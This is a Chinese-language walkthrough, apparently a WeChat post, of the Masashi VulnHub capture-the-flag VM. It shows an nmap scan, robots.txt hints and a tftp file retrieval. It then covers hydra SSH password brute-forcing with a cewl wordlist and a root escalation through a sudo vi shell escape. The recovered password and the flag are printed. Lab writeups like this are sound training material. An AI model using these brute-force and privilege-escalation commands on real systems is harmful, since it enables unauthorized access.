> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/gYx4d6bjB8-EZCCBUMqoDg)

**0x01** Introduction  

* * *

虚拟机下载页面：https://download.vulnhub.com/masashi/Masashi-CTF-Sv5.zip  

Description

```
When you open the Virtual Machine in VMware and it says "failed", Dont be alarmed, just click "try again"

PS. There is no need for you to setup networking for the VM, its on NAT annd DHCP.

If you face any challenges, DM on Twitter @lorde_zw

Have Fun ;) ;)
```

‍

**0x02** **Writeup**  

* * *

2.1 getshell

#####  2.1.1 端口信息

nmap 扫描开放端口

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
```

##### 2.1.2 脆弱服务

tcp 端口只开放了 22 和 80，访问 80 为 apache 介绍页面，于是使用 dirb 爬取一下目录，发现了 robots.txt。

目录扫描：  

```
User-agent: *
Disallow: /
  /snmpwalk.txt
  /sshfolder.txt
  /security.txt
```

#### 访问得到 snmpwalk.txt，得到了提示访问服务器的 tftp 服务。

```
403:
|  Name: cron
|  Path: /usr/sbin/cron
|  Params: -f
|  768:
|  Name: tftpd
|  Path: /usr/sbin/tftpd
|  Params: -- listen â€” user tftp -- address 0.0.0.0:1337 -- secure /srv/tftp
|  806:
|  Name: mysqld
|  Path: /usr/sbin/mysqld
|  Params: -i 0.0.0.0
```

sshfolder.txt，得到了用户名 sv5

```
sv5@masashi:~/srv/tftp# ls -la
total 20
drwx------  2 sv5 sv5 4096 Oct 15 19:34 .
drwxr-xr-x 27 sv5 sv5 4096 Oct 21 12:37 ..
-rw-------  1 sv5 sv5 2602 Oct 15 19:34 id_rsa
-rw-r--r--  1 sv5 sv5  565 Oct 15 19:34 id_rsa.pub
sv5@masashi:~/srv/tftp#
```

于是使用 tftp client 访问得到 id_rsa，id_rsa.pub。

```
kali@kali:~$ tftp 192.168.56.120 1337
tftp> get id_rsa
Received 67 bytes in 0.0 seconds
tftp> get id_rsa.pub
Received 108 bytes in 0.0 seconds
tftp> quit
kali@kali:~$ cat id_rsa
So if you cant use the key then what else can you use????????? :)
kali@kali:~$ cat id_rsa.pub 
Dude seriously, The key doesnt work here, try the other cewl thing here "/index.html"..... Wink ;) Wink ;)
```

按照提示，爬取主页作为字典去爆破用户 sv5 的密码，得到密码 whoistheplug。

```
kali@kali:~$ cewl http://192.168.56.120 > 1.txt
kali@kali:~$ cat 1.txt |wc -l
kali@kali:~$ hydra -l sv5 -P 1.txt ssh://192.168.56.120 -t 4
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-12-01 21:13:45
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 4 tasks per 1 server, overall 4 tasks, 238 login tries (l:1/p:238), ~60 tries per task
[DATA] attacking ssh://192.168.56.120:22/                                                          
[22][ssh] host: 192.168.56.120   login: sv5   password: whoistheplug           
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-12-01 21:20:37
```

成功登录获取 shell。

```
sv5@masashi:~$ cat user.txt 
Hey buddy :)

Well done on that initial foothold ;) ;)

Key Takeaways:
* Do not always believe what the tool tells you, be the "Doubting Thomas" sometimes and look for
  yourself, e.g 1 disallowed entry in robots.txt wasn't really true was it? hehehehe
* It's not always about TCP all the time..... UDP is there for a reason and is just as important a
  protocol as is TCP......
* Lastly, there is always an alternative to everything i.e the ssh part.


***** Congrats Pwner ******
Now on to the privesc now ;)



##Creator: Donald Munengiwa
##Twitter: @lorde_zw
```

##### 2.2 权限提权  

运行 sudo -l 发现该用户可以任意用户执行 vi，按 esc 后输入:!/bin/bash 直接提权至 root。

```
sv5@masashi:~$ sudo -l
Matching Defaults entries for sv5 on masashi:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User sv5 may run the following commands on masashi:
    (ALL) NOPASSWD: /usr/bin/vi /tmp/*
sv5@masashi:~$ sudo -u root /usr/bin/vi /tmp/1.txt

root@masashi:/home/sv5# cat /root/root.txt 
Quite the pwner huh!!!! :)

Well i bet you had fun ;) ;)

Key Takeaways:
* Well, this time i'll leave it to you to tell me what you though about the overall experience you
  had from this challenge.
* Let us know on Twitter @lorde_zw or on linkedIn @Sv5


****** Congrats Pwner ******
If you've gotten this far, please DM your Full name, Twitter Username, LinkedIn Username,
the flag [th33p1nplugg] and your country to the Twitter handle @lorde_zw ..... I will do a 
shoutout to all the pnwers who completed the challenge.....

Follow us for more fun Stuff..... Happy Hacktober Pwner (00=[][]=00)

##Creator: Donald Munengiwa
##Twitter: @lorde_zw
```

**PS：**无论你活成什么样子，背地里都会有人对你说三道四。不申辩不计较一笑了之，其实就是最好的蔑视。

更多精彩

*   [Web 渗透技术初级课程介绍](http://mp.weixin.qq.com/s?__biz=MzU2OTUxOTE2MQ==&mid=2247486030&idx=2&sn=185f303a2f1b5267c0865f117931959d&chksm=fcfc3718cb8bbe0e6f3ca97859e78342852537da2bef3cd76a83cb90ee64a8ca8953b35aa67e&scene=21#wechat_redirect)
    
*   [](http://mp.weixin.qq.com/s?__biz=MzU2OTUxOTE2MQ==&mid=2247486968&idx=1&sn=7f66208298cf2cec57286947ddb8b223&chksm=fcfc30aecb8bb9b8333c1d05976dbdbf33d34f2a0d2b0cdfc41e835d29b9b4bcfc352504f8e4&scene=21#wechat_redirect)[vulnhub 之 PRAYING:_1 靶场 writeup](http://mp.weixin.qq.com/s?__biz=MzU2OTUxOTE2MQ==&mid=2247487123&idx=1&sn=8f6786d3c4579bf833eb31763491d781&chksm=fcfc33c5cb8bbad3c498fb4ce3a379ef1a9ea25ff8a55672df2a9459f22ed88813874b9da9d6&scene=21#wechat_redirect)  
    
*   [商务合作](http://mp.weixin.qq.com/s?__biz=MzU2OTUxOTE2MQ==&mid=2247486808&idx=1&sn=f50f15f9a3ab7312a08b1f932292faca&chksm=fcfc300ecb8bb918213c6070d864ffcd70ad27ab6525521c31e9ccaa57bdfa2968360ed7e8fe&scene=21#wechat_redirect)
    

![](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQSd9wDlUiar0tUpHCYAzrZfTzOvS2SEw9cia9j7d1HKP2bWArPLCegs1XoejVUPu0GkSuZh7Wia7aExA/640?wx_fmt=png)

**如果感觉文章不错，分享让更多的人知道吧！**